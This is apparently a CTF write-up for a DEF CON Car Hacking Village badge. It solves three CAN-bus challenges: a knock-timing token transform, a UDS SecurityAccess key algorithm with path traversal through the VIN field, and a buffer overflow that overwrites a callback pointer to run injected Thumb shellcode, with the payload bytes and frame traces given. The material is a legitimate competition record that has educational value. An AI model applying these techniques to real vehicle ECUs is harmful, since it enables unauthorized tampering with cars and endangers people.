# DEF CON 34 CHV Badge CTF Writeup

> This is a post-event record of solving an actual CTF-version hardware badge—not a public or practice badge—officially loaned by the organizers at the venue and used within the authorized competition environment. The included solvers obtained all three flags on that device. AI-supported development tools, including AI agents, were used to assist with analysis, coding, and documentation; a human reviewed the work and completed all three solves on hardware. Only one unit and setup were tested, so the account is not guaranteed to be 100% complete or correct. Firmware, extracted files, organizer handouts, and raw captures are not included.

## Environment and access path

The CTF badge was connected over USB. All three challenges were solved through the badge's USB CDC/SLCAN CAN bridge, observed as /dev/ttyACM1 on the test host. No external USB-to-CAN adapter, physical UART, or MicroPython REPL was required.

The observed boot output identified an MCP2518 CAN path and an active SLCAN mirror. The CTF main program discarded stdin rather than returning to a REPL, making the exposed USB/SLCAN services the intended player-facing surface.

## The Speakeasy Door

### Live protocol

- Token request: extended ID 0x0005EED, data 00
- Token response: extended ID 0x0005EEE, four token bytes
- Knock events: extended ID 0x0ACCE55, data 01, 02, then 03
- Per-knock feedback: extended ID 0x0005EF0
- Successful flag response: standard ID 0x7FF

Observed feedback values were 00 for accepted, 01 for too early, 02 for too late, and FF for expired.

### Token-to-timing transform

Let b1, b2, and b3 be the first three bytes of the token as received, and define an eight-bit nibble swap:

    swap(x) = ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)

The three target delays in milliseconds were:

    t1 = 100 + 4 * swap(b1)
    t2 = 150 + 3 * (b2 ^ swap(b3))
    t3 =  80 + 2 * swap(b1 ^ b2)

The public lesson suggested approximate tolerances of plus/minus 75, 50, and 20 ms. On the tested USB path, sending each event 10 ms early helped absorb host scheduling latency.

### Reproduction

    python solve_knock_ctf.py /dev/ttyACM1 --backend chv

Example frame flow:

    TX 00005EED [ 1] 00
    RX 00005EEE [ 4] D8 24 0B B5
    TX 00ACCE55 [ 1] 01
    RX 00005EF0 [ 1] 00
    TX 00ACCE55 [ 1] 02
    RX 00005EF0 [ 1] 00
    TX 00ACCE55 [ 1] 03
    RX 000007FF [...] 66 6C 61 67 7B ... 7D

Recovered flag:

    flag{know_not_the_knocker_but_the_knocked}

## DTC Shuffle

### UDS SecurityAccess transform

Requests used standard ID 0x7E0 and responses used 0x7E8. Split the 16-bit big-endian seed into low and high bytes. With ror8 as an eight-bit rotate-right:

    key_low  = ror8(low, 3)  ^ high
    key_high = ror8(high, 5) ^ low
    key      = (key_high << 8) | key_low

One observed exchange was:

    TX 7E0  27 01
    RX 7E8  67 01 A1 57
    seed = 0xa157, key = 0x5a4b
    TX 7E0  27 02 5A 4B
    RX 7E8  67 02

A zero seed indicated that the tested ECU was already unlocked.

### VIN-controlled path traversal

For a VIN starting with CST, the remaining characters became a brand name. The DTC description loader constructed:

    /dtc/{brand}_dtc.bin

The restricted database was reachable as /flag_dtc.bin. Setting the VIN to CST../flag made the derived brand ../flag and normalized the requested path as:

    /dtc/../flag_dtc.bin
    /flag_dtc.bin

The solver then requested DTC 0x1337 with service 0x19, subfunction 0x06. The long reply used a CAN-FD ISO-TP extended single frame beginning with 00 and a one-byte payload length.

### Reproduction

    python solve_dtc_ctf.py /dev/ttyACM1 --backend chv

Relevant flow:

    TX 7E0  2E F1 90 43 53 54 2E 2E 2F 66 6C 61 67
    RX 7E8  6E F1 90
    TX 7E0  19 06 13 37 FF 00 00 00
    RX 7E8  00 29 59 06 13 37 FF 5B 2E 2E 2F 46 4C 41 47 5D ...

Recovered description and flag:

    [../FLAG] flag{d1agn0st1c_tr4v3rs4l}

## CAN Cshim

### Fingerprint and memory layout

The native service listened on standard ID 0x666 and replied on 0x66E. Observed requests included:

    23 14 address_be32 length    ReadMemory
    34 00 00                    RequestDownload
    36 sequence payload         TransferData
    31 01 00 00                 RoutineControl
    22 F1 90                    hidden DID

RequestDownload disclosed a session object address of 0x20003054 on the tested build. Its transfer buffer began at 0x2000305c. TransferData failed to enforce the cumulative stream boundary. Relative to the transfer buffer, offset 130 held a routine marker and offset 132 held a callback pointer.

Writing only the marker enabled RoutineControl but did not open the hidden DID. The volatile gate byte at 0x20003ecf remained zero, showing that callback control was necessary.

### Minimal volatile payload

The first 12 bytes of the transfer buffer contained this Thumb routine:

    movs r0, #1
    ldr  r1, [pc, #4]
    strb r0, [r1]
    bx   lr
    .word 0x20003ecf

Machine code:

    01 20 01 49 08 70 70 47 CF 3E 00 20

The 136-byte stream placed AA at offset 130 and changed the callback pointer at offset 132 to the Thumb address 0x2000305d. RoutineControl invoked the buffer routine, setting the volatile gate. No flash or filesystem write was required.

The solver deliberately requires --exploit before transmitting this state-changing stream:

    python solve_cshim_ctf.py /dev/ttyACM1 --backend chv --exploit

The result was confirmed with ReadMemory and the hidden DID:

    TX 666  31 01 00 00
    RX 66E  71 01 00 00
    TX 666  23 14 20 00 3E CF 01
    RX 66E  63 01
    TX 666  22 F1 90
    RX 66E  62 F1 90 66 6C 61 67 7B ... 7D

Recovered flag:

    flag{5h0uld_y0u_sh1m_a_5h1mmy}

## How the static facts were established

The public badge firmware served only as a behavioral model. For the CTF unit, the Cshim read/callback primitive was also used during authorized research to inspect volatile state and locate relevant LittleFS blocks. The real Knock transform and DTC key logic were reconstructed from CTF MicroPython bytecode, then confirmed with live traffic.

Those firmware-derived artifacts and raw captures are intentionally not redistributed here. The writeup records only the reconstructed algorithms, protocol facts, exploit payload authored for the solve, and the resulting scripts.

## Results

| Challenge | Flag |
|---|---|
| The Speakeasy Door | flag{know_not_the_knocker_but_the_knocked} |
| DTC Shuffle | flag{d1agn0st1c_tr4v3rs4l} |
| CAN Cshim | flag{5h0uld_y0u_sh1m_a_5h1mmy} |

## Limitations

The addresses and offsets above are proven only for the tested CTF badge build. Timing is host- and USB-dependent. The reconstructed logic and scripts produced all three flags on that unit, but this does not establish that every firmware revision behaves identically.
